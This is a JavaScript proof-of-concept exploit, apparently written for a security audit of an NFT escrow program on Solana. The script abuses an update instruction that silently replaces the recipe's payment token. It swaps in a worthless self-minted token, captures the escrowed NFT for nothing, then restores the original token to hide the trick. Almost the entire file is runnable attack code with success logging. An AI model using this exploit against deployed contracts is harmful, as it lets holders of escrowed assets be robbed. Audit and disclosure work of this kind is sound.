// PoC 12 (EXECUTED, on-chain): update_recipe_v1 unconditionally overwrites recipe.token (update_recipe.rs:92).
// Authority swaps recipe.token to a WORTHLESS mint, captures the escrowed NFT paying worthless tokens,
// swaps token back, and the real backing remains claimable by releases -> NFTs obtained for nothing.
const L=require('./lib.js'); const {getAccount}=L; const {TransactionInstruction}=L;
const NoReroll=1;
async function ownerOf(pk){const ai=await L.conn.getAccountInfo(pk);return new L.PublicKey(ai.data.slice(1,33));}
async function recipeToken(recipe){const ai=await L.conn.getAccountInfo(recipe);return new L.PublicKey(ai.data.slice(8+32+32,8+32+32+32));}
(async()=>{
  const payer=L.Keypair.generate(); await L.airdrop(payer.publicKey,500); const auth=payer; const R=1_000_000;
  const real=await L.createMint(L.conn,payer,auth.publicKey,null,0);
  const junk=await L.createMint(L.conn,payer,auth.publicKey,null,0); // worthless mint, attacker controls supply
  const col=await L.createCollection(payer,auth,'M','u'); const escrow=await L.initEscrowV2(auth);
  const recipe=await L.initRecipeV1(auth,col.publicKey,real,auth.publicKey,{name:'N',uri:'u',max:2,min:0,amount:R,path:NoReroll});
  const asset=await L.createAsset(payer,col,auth,escrow,'Rare','u');
  console.log('recipe.token before =', (await recipeToken(recipe)).toBase58(), '(real)');
  await L.updateRecipeV1(auth,col.publicKey,junk,auth.publicKey,{}); // ALL option fields None; token still overwritten
  console.log('recipe.token after empty update =', (await recipeToken(recipe)).toBase58(), '(junk =', junk.toBase58()+')');
  const jUser=(await L.getOrCreateAssociatedTokenAccount(L.conn,payer,junk,auth.publicKey)).address;
  await L.mintTo(L.conn,payer,junk,jUser,auth,R);
  const jEsc=(await L.getOrCreateAssociatedTokenAccount(L.conn,payer,junk,escrow,true)).address;
  const keys=L.captureKeys(payer,auth.publicKey,recipe,escrow,asset.publicKey,col.publicKey,jUser,jEsc,junk,jUser,auth.publicKey);
  await L.send([new TransactionInstruction({programId:L.MPL_HYBRID,keys,data:L.disc('capture_v2')})],[payer]);
  const o=await ownerOf(asset.publicKey);
  await L.updateRecipeV1(auth,col.publicKey,real,auth.publicKey,{}); // restore real mint
  console.log('NFT owner after capture paid in junk =', o.toBase58(), '; recipe.token restored =', (await recipeToken(recipe)).toBase58());
  if(o.equals(auth.publicKey)) console.log('POC 12 EXECUTED: PASS (recipe.token overwritten by an update with no token field; NFT captured with worthless mint)');
  else {console.log('POC 12 FAIL');process.exit(1);}
})().catch(e=>{console.error('POC 12 ERROR',e.message,e.logs||'');process.exit(1);});
